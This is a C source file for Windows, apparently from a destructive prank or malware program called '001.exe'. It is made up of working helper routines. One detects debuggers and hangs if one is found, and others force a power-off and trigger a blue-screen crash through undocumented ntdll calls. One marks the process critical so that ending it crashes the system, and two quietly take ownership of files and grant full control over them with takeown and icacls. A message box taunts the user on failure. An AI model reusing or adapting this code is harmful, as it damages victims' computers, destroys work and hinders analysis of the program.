#include "001.h"

#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

BOOL _001 GetWinVersion( WIN_VERSION_INFO* info )
{
	DLLFunctionDefW( L"ntdll.dll", NTAPI, NTSTATUS, RtlGetVersion, ( POSVERSIONINFOEXW lpVersionInformation ) );
	OSVERSIONINFOEXW osv;
	osv.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXW );
	if ( RtlGetVersion( &osv ) == 0 )
	{
		FreeLibrary( RtlGetVersionDLL );
		info->Major = osv.dwMajorVersion;
		info->Minor = osv.dwMinorVersion;
		info->BuildNum = osv.dwBuildNumber;
		if ( osv.dwBuildNumber >= 22000 )
			info->Major = 11;

		return TRUE;
	}
	return FALSE;
}

void _001 AntiDebug( void )
{
#ifdef WIN32
	PPEB pPeb = ( PPEB ) __readfsdword( 0x30 );
	DWORD dwNtGlobalFlag = *( PDWORD ) ( ( PBYTE ) pPeb + 0x68 );
#else
	PPEB pPeb = ( PPEB ) __readgsqword( 0x60 );
	DWORD dwNtGlobalFlag = *( PDWORD ) ( ( PBYTE ) pPeb + 0xBC );
#endif
	if ( dwNtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED )
		while ( TRUE );
}

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

BOOL _001 Shutdown( unsigned int ShutdownOption, DWORD Force )
{
	HANDLE	hToken;
	TOKEN_PRIVILEGES	TokenPri;

	// プロセストークンを取得
	if ( OpenProcessToken( GetCurrentProcess( ), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) == FALSE )
	{
		return FALSE;
	}
	// シャットダウン権限の LUID を取得
	if ( LookupPrivilegeValue( NULL, SE_SHUTDOWN_NAME, &TokenPri.Privileges[ 0 ].Luid ) == FALSE )
	{
		return FALSE;
	}
	// シャットダウン権限を与える
	TokenPri.PrivilegeCount = 1;
	TokenPri.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges( hToken, FALSE, &TokenPri, 0, ( PTOKEN_PRIVILEGES ) NULL, 0 );
	if ( GetLastError( ) != ERROR_SUCCESS )
	{
		return FALSE;
	}
	//シャットダウン
	if ( ExitWindowsEx( ShutdownOption, Force ) )
	{
		return TRUE;
	}

	return FALSE;
}

BOOL _001 Poweroff( SHUTDOWN_ACTION shutdownOption )
{
	NTSTATUS ntReturnValue;
	BOOLEAN bUnused;
	BOOL bSuccess;

	DLLFunctionDefW( L"ntdll.dll", NTAPI, NTSTATUS, RtlAdjustPrivilege, ( ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled ) );
	DLLFunctionDefW( L"ntdll.dll", NTAPI, NTSTATUS, NtShutdownSystem, ( _In_ SHUTDOWN_ACTION Action ) );
	DLLFunctionDefW( L"ntdll.dll", NTAPI, NTSTATUS, NtSetSystemPowerState, ( _In_ POWER_ACTION SystemAction, _In_ SYSTEM_POWER_STATE MinSystemState, _In_ ULONG Flags ) );

	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( SHUTDOWN_PRIVILEGE /* SeShutdownPrivilege */, TRUE, FALSE, &bUnused );
		FreeLibrary( RtlAdjustPrivilegeDLL );

		if ( ntReturnValue )
		{
			return FALSE;
		}
	}

	if ( NtSetSystemPowerState )
	{
		ntReturnValue = NtSetSystemPowerState( PowerActionShutdownOff, PowerSystemShutdown, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY );
		FreeLibrary( NtSetSystemPowerStateDLL );

		if ( !ntReturnValue )
		{
			return TRUE;
		}
	}

	if ( NtShutdownSystem )
	{
		ntReturnValue = NtShutdownSystem( shutdownOption );
		FreeLibrary( NtShutdownSystemDLL );

		if ( !ntReturnValue )
		{
			return TRUE;
		}
	}
	unsigned int uFlags = 0;
	if ( shutdownOption == ShutdownPowerOff )
		uFlags = EWX_POWEROFF;
	if ( shutdownOption == ShutdownReboot )
		uFlags = EWX_REBOOT;

	bSuccess = ExitWindowsEx( uFlags, EWX_FORCE );

	if ( !bSuccess )
	{
		MessageBoxW( NULL, L"I can't power off the computer.\nYou're lucky this time...", L"001.exe", MB_OK | MB_ICONERROR );

		return FALSE;
	}

	return TRUE;
}

BOOL _001 BSOD( int error_code )
{
	DLLFunctionDefW( L"ntdll.dll", NTAPI, NTSTATUS, RtlAdjustPrivilege, ( ULONG privilege, BOOLEAN enable, BOOLEAN current_thread, PBOOLEAN enabled ) );
	DLLFunctionDefW( L"ntdll.dll", NTAPI, NTSTATUS, NtRaiseHardError, ( NTSTATUS error_status, ULONG number_of_parameters, ULONG unicode_string_parameter_mask, PULONG_PTR parameters, ULONG response_option, PULONG reponse ) );

	NTSTATUS ntReturnValue;
	BOOLEAN bUnused;

	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( SHUTDOWN_PRIVILEGE /* SeShutdownPrivilege */, TRUE, FALSE, &bUnused );
		FreeLibrary( RtlAdjustPrivilegeDLL );

		if ( ntReturnValue )
		{
			return FALSE;
		}
	}

	if ( NtRaiseHardError )
	{
		ULONG response;
		ntReturnValue = NtRaiseHardError( ( NTSTATUS ) error_code, 0, 0, NULL, OPTION_SHUTDOWN, &response );
		FreeLibrary( NtRaiseHardErrorDLL );

		if ( !ntReturnValue )
		{
			return TRUE;
		}
	}

	return FALSE;
}

BOOL _001 SetProcessCritical( BOOLEAN Critical )
{
	DLLFunctionDefW( L"ntdll.dll", NTAPI, NTSTATUS, RtlAdjustPrivilege, ( ULONG privilege, BOOLEAN enable, BOOLEAN current_thread, PBOOLEAN enabled ) );
	DLLFunctionDefW( L"ntdll.dll", NTAPI, NTSTATUS, RtlSetProcessIsCritical, ( IN BOOLEAN NewValue, OUT PBOOLEAN OldValue, IN BOOLEAN IsWinlogon ) );

	NTSTATUS ntReturnValue;
	BOOLEAN bUnused;
	ULONG ulBreakOnTermination;

	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( 20 /* SeDebugPrivilege */, TRUE, FALSE, &bUnused );
		FreeLibrary( RtlAdjustPrivilegeDLL );

		if ( ntReturnValue )
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}
	if ( RtlSetProcessIsCritical )
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical( Critical, NULL, FALSE );
		FreeLibrary( RtlSetProcessIsCriticalDLL);

		if ( ntReturnValue )
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}


	return TRUE;
}

void _001 TakeOwn( WCHAR* Path )
{
	WCHAR path[ MAX_PATH ];
	lstrcpyW( path, L"/F " );
	cat( path, Path );

	if ( Wow64EnableWow64FsRedirection( FALSE ) )
	{
		ShellExecuteW( NULL, L"runas", L"C:\\Windows\\System32\\takeown.exe", path, NULL, SW_HIDE );
	}
	if ( !Wow64EnableWow64FsRedirection( TRUE ) )
	{
		ShellExecuteW( NULL, L"runas", L"C:\\Windows\\System32\\takeown.exe", path, NULL, SW_HIDE );
	}

	return;
}

void _001 Icacls( WCHAR* Path, WCHAR* Owner )
{
	WCHAR path[ MAX_PATH ];
	lstrcpyW( path, L"\"" );
	cat( path, Path );
	cat( path, L"\"" );
	cat( path, L" /grant " );
	cat( path, L"\"" );
	cat( path, Owner );
	cat( path, L"\"" );
	cat( path, L":F /T" );

	if ( Wow64EnableWow64FsRedirection( FALSE ) )
	{
		ShellExecuteW( NULL, L"runas", L"C:\\Windows\\System32\\icacls.exe", path, NULL, SW_HIDE );
	}
	if ( !Wow64EnableWow64FsRedirection( TRUE ) )
	{
		ShellExecuteW( NULL, L"runas", L"C:\\Windows\\System32\\icacls.exe", path, NULL, SW_HIDE );
	}

	return;
}

BOOL _001 _001_CopyFile( _In_ LPCWSTR lpExistingFileName, _In_ LPCWSTR lpNewFileName, _In_ BOOL bFailIfExists )
{
	if ( Wow64EnableWow64FsRedirection( FALSE ) )
	{
		if ( CopyFileW( lpExistingFileName, lpNewFileName, bFailIfExists ) )
			return TRUE;
	}
	if ( !Wow64EnableWow64FsRedirection( TRUE ) )
	{
		if ( CopyFileW( lpExistingFileName, lpNewFileName, bFailIfExists ) )
			return TRUE;
	}

	return FALSE;
}

HINSTANCE _001 _001_ShellExecute( _In_opt_ HWND hwnd, _In_opt_ LPCWSTR lpOperation, _In_ LPCWSTR lpFile, _In_opt_ LPCWSTR lpParameters, _In_opt_ LPCWSTR lpDirectory, _In_ INT nShowCmd )
{
	if ( Wow64EnableWow64FsRedirection( FALSE ) )
	{
		return ShellExecuteW( hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd );
	}
	if ( !Wow64EnableWow64FsRedirection( TRUE ) )
	{
		ShellExecuteW( hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd );
		return ShellExecuteW( hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd );
	}

	return NULL;
}